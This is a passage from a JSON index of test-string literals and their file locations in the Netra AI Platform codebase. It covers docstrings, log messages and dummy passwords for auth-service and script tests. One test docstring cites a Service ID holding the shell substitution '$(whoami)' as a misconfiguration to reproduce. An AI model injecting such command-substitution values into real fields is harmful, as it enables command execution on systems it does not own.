      "value": "Comprehensive failing tests for AuthDatabaseManager missing methods.\n\nThese tests explicitly test for the missing methods that are being called\nin auth_service/auth_core/database/connection.py but don't exist in AuthDatabaseManager.\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal  \n- Business Goal: Auth service stability and reliability\n- Value Impact: Ensures critical methods exist and work correctly\n- Strategic Impact: Prevents auth service failures during database initialization",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_database_manager_missing_method.py:1"
      ]
    },
    "Comprehensive fake test detection and reporting": {
      "value": "Comprehensive fake test detection and reporting",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/fake_test_scanner.py:361"
      ]
    },
    "Comprehensive frontend test runner for Netra AI Platform": {
      "value": "Comprehensive frontend test runner for Netra AI Platform",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend.py:349"
      ]
    },
    "Comprehensive frontend test runner for Netra AI Platform\nDesigned for easy use by Claude Code and CI/CD pipelines\nNow with test isolation support for concurrent execution": {
      "value": "Comprehensive frontend test runner for Netra AI Platform\nDesigned for easy use by Claude Code and CI/CD pipelines\nNow with test isolation support for concurrent execution",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend.py:2"
      ]
    },
    "Comprehensive report saved to": {
      "value": "Comprehensive report saved to",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/fake_test_scanner.py:353"
      ]
    },
    "Comprehensive script to fix all test import errors systematically.\nAnalyzes failing test files and fixes common import patterns.": {
      "value": "Comprehensive script to fix all test import errors systematically.\nAnalyzes failing test files and fixes common import patterns.",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_errors.py:2"
      ]
    },
    "Comprehensive staging deployment validation script.\nTests all critical endpoints and services on staging environment.": {
      "value": "Comprehensive staging deployment validation script.\nTests all critical endpoints and services on staging environment.",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_deployment.py:2"
      ]
    },
    "Comprehensive suffix": {
      "value": "Comprehensive suffix",
      "category": "test_literals",
      "locations": [
        "scripts/generate_test_audit.py:103"
      ]
    },
    "Comprehensive system-wide tests": {
      "value": "Comprehensive system-wide tests",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_config.py:120"
      ]
    },
    "Comprehensive test of DatabaseURLBuilder functionality and edge cases.": {
      "value": "Comprehensive test of DatabaseURLBuilder functionality and edge cases.",
      "category": "test_literals",
      "locations": [
        "scripts/test_database_url_builder_comprehensive.py:1"
      ]
    },
    "Comprehensive test size limits validator for Netra testing system.\n\nEnforces SPEC/testing.xml requirements:\n- Test files MUST follow same 450-line limit as production code\n- Test functions MUST follow same 25-line limit as production code\n- Prevents test files from becoming unmaintainable \"ravioli code\"\n\nFeatures:\n- Scans all test files for size violations\n- Reports files exceeding 300 lines\n- Reports functions exceeding 8 lines  \n- Provides refactoring suggestions\n- Can auto-split large test files\n- Integration with test runner": {
      "value": "Comprehensive test size limits validator for Netra testing system.\n\nEnforces SPEC/testing.xml requirements:\n- Test files MUST follow same 450-line limit as production code\n- Test functions MUST follow same 25-line limit as production code\n- Prevents test files from becoming unmaintainable \"ravioli code\"\n\nFeatures:\n- Scans all test files for size violations\n- Reports files exceeding 300 lines\n- Reports functions exceeding 8 lines  \n- Provides refactoring suggestions\n- Can auto-split large test files\n- Integration with test runner",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_size_validator.py:2"
      ]
    },
    "Computed startup order:": {
      "value": "Computed startup order:",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:90"
      ]
    },
    "Concurrent attack should only allow one success": {
      "value": "Concurrent attack should only allow one success",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_authorization_code_reuse_prevention.py:444"
      ]
    },
    "Concurrent validation failed:": {
      "value": "Concurrent validation failed:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_token_validation.py:340"
      ]
    },
    "Concurrent verification failed:": {
      "value": "Concurrent verification failed:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_password_hashing_basics.py:254"
      ]
    },
    "ConcurrentTest123!": {
      "value": "ConcurrentTest123!",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_password_hashing_basics.py:218"
      ]
    },
    "Confidence:": {
      "value": "Confidence:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/demo_test_size_enforcement.py:97",
        "scripts/compliance/test_refactor_helper.py:722"
      ]
    },
    "Config endpoint returned": {
      "value": "Config endpoint returned",
      "category": "test_literals",
      "locations": [
        "scripts/test_websocket_dev_mode.py:105"
      ]
    },
    "Config endpoint test failed:": {
      "value": "Config endpoint test failed:",
      "category": "test_literals",
      "locations": [
        "scripts/test_websocket_dev_mode.py:109"
      ]
    },
    "Configuration": {
      "value": "Configuration",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_database_failures.py:228",
        "auth_service/tests/test_critical_staging_database_failures.py:230"
      ]
    },
    "Configuration Loading": {
      "value": "Configuration Loading",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_startup.py:235"
      ]
    },
    "Configuration Loading Test": {
      "value": "Configuration Loading Test",
      "category": "test_literals",
      "locations": [
        "scripts/test_config_loading.py:28"
      ]
    },
    "Configuration error for": {
      "value": "Configuration error for",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_database_connection_validation.py:408"
      ]
    },
    "Configuration error:": {
      "value": "Configuration error:",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_db_direct.py:69"
      ]
    },
    "Configuration failed to load": {
      "value": "Configuration failed to load",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_startup.py:60"
      ]
    },
    "Configuration fixes applied:": {
      "value": "Configuration fixes applied:",
      "category": "test_literals",
      "locations": [
        "scripts/align_test_imports.py:428"
      ]
    },
    "Configuration reloaded": {
      "value": "Configuration reloaded",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/log_generator.py:132"
      ]
    },
    "Configuration updated successfully.": {
      "value": "Configuration updated successfully.",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/llm_response_generator.py:215"
      ]
    },
    "Configuration valid:": {
      "value": "Configuration valid:",
      "category": "test_literals",
      "locations": [
        "scripts/test_ssl_certificates_staging.py:226",
        "scripts/test_staging_migrations.py:55"
      ]
    },
    "Configuration validation failed:": {
      "value": "Configuration validation failed:",
      "category": "test_literals",
      "locations": [
        "auth_service/test_url_construction.py:75",
        "scripts/test_example_message_flow.py:243"
      ]
    },
    "Conflicts:": {
      "value": "Conflicts:",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:885"
      ]
    },
    "Connected": {
      "value": "Connected",
      "category": "test_literals",
      "locations": [
        "frontend/components/chat/ConnectionStatusIndicator.test.tsx:23"
      ]
    },
    "Connection Analysis:": {
      "value": "Connection Analysis:",
      "category": "test_literals",
      "locations": [
        "auth_service/test_url_construction.py:193"
      ]
    },
    "Connection Issue Analysis": {
      "value": "Connection Issue Analysis",
      "category": "test_literals",
      "locations": [
        "auth_service/test_url_construction.py:221"
      ]
    },
    "Connection Pooling URLs": {
      "value": "Connection Pooling URLs",
      "category": "test_literals",
      "locations": [
        "scripts/test_database_url_builder_comprehensive.py:310"
      ]
    },
    "Connection Status Utils": {
      "value": "Connection Status Utils",
      "category": "test_literals",
      "locations": [
        "frontend/components/chat/ConnectionStatusIndicator.test.tsx:12"
      ]
    },
    "Connection aborted during cleanup": {
      "value": "Connection aborted during cleanup",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_graceful_shutdown_failures.py:94"
      ]
    },
    "Connection error": {
      "value": "Connection error",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_errors.py:333"
      ]
    },
    "Connection failed": {
      "value": "Connection failed",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_errors.py:332",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:786"
      ]
    },
    "Connection lost": {
      "value": "Connection lost",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_redis_connection_failover.py:279"
      ]
    },
    "Connection pool disposal failed - connections still active": {
      "value": "Connection pool disposal failed - connections still active",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_graceful_shutdown_failures.py:137"
      ]
    },
    "Connection pool exhausted": {
      "value": "Connection pool exhausted",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_database_manager.py:115"
      ]
    },
    "Connection pool exhausted, queuing request": {
      "value": "Connection pool exhausted, queuing request",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/log_generator.py:103"
      ]
    },
    "Connection pool hanging - active connections won't close": {
      "value": "Connection pool hanging - active connections won't close",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_shutdown_timeouts.py:193"
      ]
    },
    "Connection pool usage high": {
      "value": "Connection pool usage high",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_postgres_compliance.py:172"
      ]
    },
    "Connection refused to Redis server": {
      "value": "Connection refused to Redis server",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:423"
      ]
    },
    "Connection refused: Too many connections": {
      "value": "Connection refused: Too many connections",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/log_generator.py:109"
      ]
    },
    "Connection reset by peer": {
      "value": "Connection reset by peer",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_graceful_shutdown_failures.py:92"
      ]
    },
    "Connection timeout": {
      "value": "Connection timeout",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_redis_connection_failover.py:175"
      ]
    },
    "Connection timeout occurred": {
      "value": "Connection timeout occurred",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_database_failures.py:299"
      ]
    },
    "Connection type:": {
      "value": "Connection type:",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_db_direct.py:80"
      ]
    },
    "Connection type: Cloud SQL Unix Socket": {
      "value": "Connection type: Cloud SQL Unix Socket",
      "category": "test_literals",
      "locations": [
        "scripts/test_ssl_certificates_staging.py:44"
      ]
    },
    "Connection type: TCP": {
      "value": "Connection type: TCP",
      "category": "test_literals",
      "locations": [
        "scripts/test_ssl_certificates_staging.py:49"
      ]
    },
    "Consider cluster-wide CPU optimization": {
      "value": "Consider cluster-wide CPU optimization",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:440"
      ]
    },
    "Consistently Failing Tests:": {
      "value": "Consistently Failing Tests:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/fake_test_scanner.py:296"
      ]
    },
    "Container environment processing test - Service ID:": {
      "value": "Container environment processing test - Service ID:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_service_id_configuration_failures.py:155"
      ]
    },
    "Contains sslmode parameter for Cloud SQL": {
      "value": "Contains sslmode parameter for Cloud SQL",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_auth_ssl_failures.py:319"
      ]
    },
    "Content-Type": {
      "value": "Content-Type",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:287",
        "auth_service/tests/test_security.py:366",
        "auth_service/tests/utils/test_client.py:24",
        "scripts/test_staging_deployment.py:130"
      ]
    },
    "Continue anyway? (y/n):": {
      "value": "Continue anyway? (y/n):",
      "category": "test_literals",
      "locations": [
        "scripts/iterative_test_fix_loop.py:151"
      ]
    },
    "Continue testing even after failures": {
      "value": "Continue testing even after failures",
      "category": "test_literals",
      "locations": [
        "scripts/test_imports.py:58"
      ]
    },
    "Coordination should succeed with optional service failures": {
      "value": "Coordination should succeed with optional service failures",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:260"
      ]
    },
    "Core AI optimization delivering 30-50% cost savings for": {
      "value": "Core AI optimization delivering 30-50% cost savings for",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:491"
      ]
    },
    "Core Tests - Split from test_oauth_flows.py": {
      "value": "Core Tests - Split from test_oauth_flows.py",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_flows_core.py:1"
      ]
    },
    "Core functionality unit tests": {
      "value": "Core functionality unit tests",
      "category": "test_literals",
      "locations": [
        "scripts/test_example_message_flow.py:48"
      ]
    },
    "CorrectPassword123": {
      "value": "CorrectPassword123",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_password_hashing_basics.py:82"
      ]
    },
    "CorrectPassword123!": {
      "value": "CorrectPassword123!",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_password_hashing_basics.py:78",
        "auth_service/tests/test_password_hashing_basics.py:85"
      ]
    },
    "CorrectPassword124!": {
      "value": "CorrectPassword124!",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_password_hashing_basics.py:83"
      ]
    },
    "Corrected test suite for verify_workflow_status.py\n\nTests various scenarios with proper expected behavior validation.": {
      "value": "Corrected test suite for verify_workflow_status.py\n\nTests various scenarios with proper expected behavior validation.",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow_status_corrected.py:2"
      ]
    },
    "Correctly detected credential issue:": {
      "value": "Correctly detected credential issue:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_database_credentials.py:149"
      ]
    },
    "Correctly detected staging URL issue:": {
      "value": "Correctly detected staging URL issue:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_database_credentials.py:298"
      ]
    },
    "Correctly rejected invalid Client ID '": {
      "value": "Correctly rejected invalid Client ID '",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_oauth_environment_failures.py:288"
      ]
    },
    "Correctly rejected malformed Service ID '": {
      "value": "Correctly rejected malformed Service ID '",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_service_id_configuration_failures.py:327"
      ]
    },
    "Correctly rejected overly long Service ID:": {
      "value": "Correctly rejected overly long Service ID:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_service_id_configuration_failures.py:358"
      ]
    },
    "Cost savings of $1,200/month achieved.": {
      "value": "Cost savings of $1,200/month achieved.",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/llm_response_generator.py:217"
      ]
    },
    "Could not auto-fix syntax in:": {
      "value": "Could not auto-fix syntax in:",
      "category": "test_literals",
      "locations": [
        "scripts/align_test_imports.py:367"
      ]
    },
    "Could not connect to PostgreSQL on ports 5432 or 5433": {
      "value": "Could not connect to PostgreSQL on ports 5432 or 5433",
      "category": "test_literals",
      "locations": [
        "scripts/test_async_postgres.py:155"
      ]
    },
    "Could not parse JSON results:": {
      "value": "Could not parse JSON results:",
      "category": "test_literals",
      "locations": [
        "scripts/test_example_message_flow.py:147"
      ]
    },
    "Could not read file:": {
      "value": "Could not read file:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/project_test_validator.py:148",
        "scripts/compliance/real_test_requirements_enforcer.py:180",
        "scripts/compliance/real_test_validator.py:103"
      ]
    },
    "Could not save report to": {
      "value": "Could not save report to",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/fake_test_scanner.py:355"
      ]
    },
    "Could not validate test file": {
      "value": "Could not validate test file",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:746"
      ]
    },
    "Count sessions (optionally for specific user)": {
      "value": "Count sessions (optionally for specific user)",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/utils/test_helpers.py:286"
      ]
    },
    "Count total sessions in database": {
      "value": "Count total sessions in database",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/base/test_mixins.py:74"
      ]
    },
    "Count total users in database": {
      "value": "Count total users in database",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/base/test_mixins.py:66",
        "auth_service/tests/utils/test_helpers.py:278"
      ]
    },
    "Coverage:": {
      "value": "Coverage:",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:366"
      ]
    },
    "Create OAuth test user in database": {
      "value": "Create OAuth test user in database",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/utils/test_helpers.py:64"
      ]
    },
    "Create all database tables": {
      "value": "Create all database tables",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/database/test_config.py:51"
      ]
    },
    "Create audit log entry": {
      "value": "Create audit log entry",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/utils/test_helpers.py:324"
      ]
    },
    "Create session cleanup service": {
      "value": "Create session cleanup service",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_session_cleanup.py:95"
      ]
    },
    "Create session in database": {
      "value": "Create session in database",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/base/test_base.py:197"
      ]
    },
    "Create test database": {
      "value": "Create test database",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/database/test_config.py:114"
      ]
    },
    "Create test session in database": {
      "value": "Create test session in database",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/utils/test_helpers.py:84"
      ]
    },
    "Create test user in database": {
      "value": "Create test user in database",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/utils/test_helpers.py:43"
      ]
    },
    "Create user in database": {
      "value": "Create user in database",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/base/test_base.py:186"
      ]
    },
    "Created": {
      "value": "Created",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_sizes.py:283"
      ]
    },
    "Created UserFlowTestBase using unittest.TestCase": {
      "value": "Created UserFlowTestBase using unittest.TestCase",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_errors.py:104"
      ]
    },
    "Created backup directory:": {
      "value": "Created backup directory:",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:755"
      ]
    },
    "Created mock Agent and AgentRun models": {
      "value": "Created mock Agent and AgentRun models",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_errors.py:134"
      ]
    },
    "Created mock AgentRun model": {
      "value": "Created mock AgentRun model",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_errors.py:129"
      ]
    },
    "Created mock ClickHouseManager for tests": {
      "value": "Created mock ClickHouseManager for tests",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_errors.py:80"
      ]
    },
    "Created mock ConversionEvent for tests": {
      "value": "Created mock ConversionEvent for tests",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_errors.py:87"
      ]
    },
    "Created mock Message model": {
      "value": "Created mock Message model",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_errors.py:116"
      ]
    },
    "Created mock Team for tests": {
      "value": "Created mock Team for tests",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_errors.py:92"
      ]
    },
    "Created mock Thread model": {
      "value": "Created mock Thread model",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_errors.py:111"
      ]
    },
    "Created mock database test fixtures": {
      "value": "Created mock database test fixtures",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_errors.py:99"
      ]
    },
    "Created mock user journey data": {
      "value": "Created mock user journey data",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_errors.py:122"
      ]
    },
    "Created split file:": {
      "value": "Created split file:",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:539"
      ]
    },
    "Created test database:": {
      "value": "Created test database:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/database/test_config.py:135"
      ]
    },
    "Created utilities file:": {
      "value": "Created utilities file:",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:567"
      ]
    },
    "Creating": {
      "value": "Creating",
      "category": "test_literals",
      "locations": [
        "scripts/start_test_services.py:89"
      ]
    },
    "Creating TF-IDF vectors...": {
      "value": "Creating TF-IDF vectors...",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:246"
      ]
    },
    "Creating tables...": {
      "value": "Creating tables...",
      "category": "test_literals",
      "locations": [
        "auth_service/debug_db_test.py:33"
      ]
    },
    "Creating test session...": {
      "value": "Creating test session...",
      "category": "test_literals",
      "locations": [
        "auth_service/debug_db_test.py:51"
      ]
    },
    "Credential validation failed:": {
      "value": "Credential validation failed:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_database_credentials.py:62"
      ]
    },
    "Critical": {
      "value": "Critical",
      "category": "test_literals",
      "locations": [
        "scripts/test_failure_scanner.py:166"
      ]
    },
    "Critical - API endpoints": {
      "value": "Critical - API endpoints",
      "category": "test_literals",
      "locations": [
        "scripts/test_failure_scanner.py:39"
      ]
    },
    "Critical - Core functionality": {
      "value": "Critical - Core functionality",
      "category": "test_literals",
      "locations": [
        "scripts/test_failure_scanner.py:38"
      ]
    },
    "Critical - Database": {
      "value": "Critical - Database",
      "category": "test_literals",
      "locations": [
        "scripts/test_failure_scanner.py:41"
      ]
    },
    "Critical - Security": {
      "value": "Critical - Security",
      "category": "test_literals",
      "locations": [
        "scripts/test_failure_scanner.py:40"
      ]
    },
    "Critical Auth Service Database Connection Failures - Failing Tests\nTests that replicate critical database connection issues found in staging logs.\n\nCRITICAL DATABASE ISSUES TO REPLICATE:\n1. Database \"netra_staging\" does not exist - causing connection failures\n2. SSL connection failures to Cloud SQL instances  \n3. Connection timeout failures during initialization\n4. Invalid database URL construction causing connection failures\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal\n- Business Goal: Database reliability and connection stability\n- Value Impact: Prevents auth service failures due to database connectivity\n- Strategic Impact: Ensures authentication availability for all customer tiers": {
      "value": "Critical Auth Service Database Connection Failures - Failing Tests\nTests that replicate critical database connection issues found in staging logs.\n\nCRITICAL DATABASE ISSUES TO REPLICATE:\n1. Database \"netra_staging\" does not exist - causing connection failures\n2. SSL connection failures to Cloud SQL instances  \n3. Connection timeout failures during initialization\n4. Invalid database URL construction causing connection failures\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal\n- Business Goal: Database reliability and connection stability\n- Value Impact: Prevents auth service failures due to database connectivity\n- Strategic Impact: Ensures authentication availability for all customer tiers",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_database_failures.py:1"
      ]
    },
    "Critical Auth Service ID Configuration Failures - Failing Tests\nTests that replicate Service ID configuration issues found in staging logs.\n\nCRITICAL SERVICE ID ISSUES TO REPLICATE:\n1. Service ID showing literal shell command instead of executed value (e.g. \"$(whoami)\")\n2. Environment variable substitution failures in containerized environments  \n3. Service ID containing invalid characters causing authentication failures\n4. Missing or malformed service identification in staging deployment\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal\n- Business Goal: Service identification and authentication reliability\n- Value Impact: Prevents service-to-service auth failures due to ID misconfiguration\n- Strategic Impact: Ensures proper service mesh authentication for enterprise deployments": {
      "value": "Critical Auth Service ID Configuration Failures - Failing Tests\nTests that replicate Service ID configuration issues found in staging logs.\n\nCRITICAL SERVICE ID ISSUES TO REPLICATE:\n1. Service ID showing literal shell command instead of executed value (e.g. \"$(whoami)\")\n2. Environment variable substitution failures in containerized environments  \n3. Service ID containing invalid characters causing authentication failures\n4. Missing or malformed service identification in staging deployment\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal\n- Business Goal: Service identification and authentication reliability\n- Value Impact: Prevents service-to-service auth failures due to ID misconfiguration\n- Strategic Impact: Ensures proper service mesh authentication for enterprise deployments",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_service_id_configuration_failures.py:1"
      ]
    },
    "Critical Auth Service Staging Issues - Failing Tests\nTests that reproduce production errors found in staging environment.\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal\n- Business Goal: Service reliability and production readiness\n- Value Impact: Prevents auth service failures in staging/production\n- Strategic Impact: Ensures authentication availability for all tiers": {
      "value": "Critical Auth Service Staging Issues - Failing Tests\nTests that reproduce production errors found in staging environment.\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal\n- Business Goal: Service reliability and production readiness\n- Value Impact: Prevents auth service failures in staging/production\n- Strategic Impact: Ensures authentication availability for all tiers",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_issues.py:1"
      ]
    },
    "Critical Auth Service Staging Shutdown Timeout Failures - Failing Tests\nTests that replicate specific graceful shutdown timeout issues found in staging logs.\n\nCRITICAL SHUTDOWN TIMEOUT ISSUES TO REPLICATE:\n1. SHUTDOWN_TIMEOUT_SECONDS environment variable not respected in staging\n2. Cloud Run termination signals not handled within allocated time window\n3. Database connection pools hanging during shutdown causing timeouts\n4. Redis session cleanup hanging during service termination\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal  \n- Business Goal: Service lifecycle reliability in production environments\n- Value Impact: Prevents ungraceful shutdowns that could cause data corruption\n- Strategic Impact: Ensures proper resource cleanup for enterprise scalability": {
      "value": "Critical Auth Service Staging Shutdown Timeout Failures - Failing Tests\nTests that replicate specific graceful shutdown timeout issues found in staging logs.\n\nCRITICAL SHUTDOWN TIMEOUT ISSUES TO REPLICATE:\n1. SHUTDOWN_TIMEOUT_SECONDS environment variable not respected in staging\n2. Cloud Run termination signals not handled within allocated time window\n3. Database connection pools hanging during shutdown causing timeouts\n4. Redis session cleanup hanging during service termination\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal  \n- Business Goal: Service lifecycle reliability in production environments\n- Value Impact: Prevents ungraceful shutdowns that could cause data corruption\n- Strategic Impact: Ensures proper resource cleanup for enterprise scalability",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_shutdown_timeouts.py:1"
      ]
    },
    "Critical OAuth Environment Variable Failures - Failing Tests\nTests that replicate missing OAuth environment variables found in staging logs.\n\nCRITICAL OAUTH ENVIRONMENT ISSUES TO REPLICATE:\n1. Missing OAUTH_HMAC_SECRET environment variable causing OAuth flow failures\n2. Missing or invalid GOOGLE_CLIENT_ID causing OAuth initialization failures\n3. Missing GOOGLE_CLIENT_SECRET causing OAuth token exchange failures  \n4. Invalid OAuth redirect URI configuration causing authentication errors\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal\n- Business Goal: OAuth authentication reliability for user onboarding\n- Value Impact: Prevents complete authentication system failures in staging/production\n- Strategic Impact: Ensures user authentication works for all customer segments": {
      "value": "Critical OAuth Environment Variable Failures - Failing Tests\nTests that replicate missing OAuth environment variables found in staging logs.\n\nCRITICAL OAUTH ENVIRONMENT ISSUES TO REPLICATE:\n1. Missing OAUTH_HMAC_SECRET environment variable causing OAuth flow failures\n2. Missing or invalid GOOGLE_CLIENT_ID causing OAuth initialization failures\n3. Missing GOOGLE_CLIENT_SECRET causing OAuth token exchange failures  \n4. Invalid OAuth redirect URI configuration causing authentication errors\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal\n- Business Goal: OAuth authentication reliability for user onboarding\n- Value Impact: Prevents complete authentication system failures in staging/production\n- Strategic Impact: Ensures user authentication works for all customer segments",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_oauth_environment_failures.py:1"
      ]
    },
    "Critical Tests (90+ score):": {
      "value": "Critical Tests (90+ score):",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:750"
      ]
    },
    "Critical credential issues found:": {
      "value": "Critical credential issues found:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_database_credentials.py:66"
      ]
    },
    "Critical deployment should fail": {
      "value": "Critical deployment should fail",
      "category": "test_literals",
      "locations": [
        "scripts/test_error_monitor_logic.py:205"
      ]
    },
    "Critical error after deployment": {
      "value": "Critical error after deployment",
      "category": "test_literals",
      "locations": [
        "scripts/test_error_monitor_logic.py:151"
      ]
    },
    "Critical errors:": {
      "value": "Critical errors:",
      "category": "test_literals",
      "locations": [
        "scripts/test_error_monitor_logic.py:99"
      ]
    },
    "Critical path tests that protect revenue": {
      "value": "Critical path tests that protect revenue",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_config.py:79"
      ]
    },
    "Critical suffix": {
      "value": "Critical suffix",
      "category": "test_literals",
      "locations": [
        "scripts/generate_test_audit.py:101"
      ]
    },
    "Current revision:": {
      "value": "Current revision:",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_migrations.py:155"
      ]
    },
    "Current size:": {
      "value": "Current size:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_limits_checker.py:193"
      ]
    },
    "Custom auth exceptions not yet implemented": {
      "value": "Custom auth exceptions not yet implemented",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_service_integration_reliability.py:128"
      ]
    },
    "Custom cache directory": {
      "value": "Custom cache directory",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:381"
      ]
    },
    "Cypress E2E:": {
      "value": "Cypress E2E:",
      "category": "test_literals",
      "locations": [
        "scripts/test_discovery_report.py:117"
      ]
    },
    "DANGEROUS: Actually perform fixes (NOT RECOMMENDED)": {
      "value": "DANGEROUS: Actually perform fixes (NOT RECOMMENDED)",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:922"
      ]
    },
    "DANGEROUS: Created": {
      "value": "DANGEROUS: Created",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:1008"
      ]
    },
    "DANGEROUS: Disable safe mode protections": {
      "value": "DANGEROUS: Disable safe mode protections",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:932"
      ]
    },
    "DANGEROUS: Second confirmation required for unsafe operations": {
      "value": "DANGEROUS: Second confirmation required for unsafe operations",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:924"
      ]
    },
    "DANGEROUSLY fixing": {
      "value": "DANGEROUSLY fixing",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:795"
      ]
    },
    "DANGEROUSLY split": {
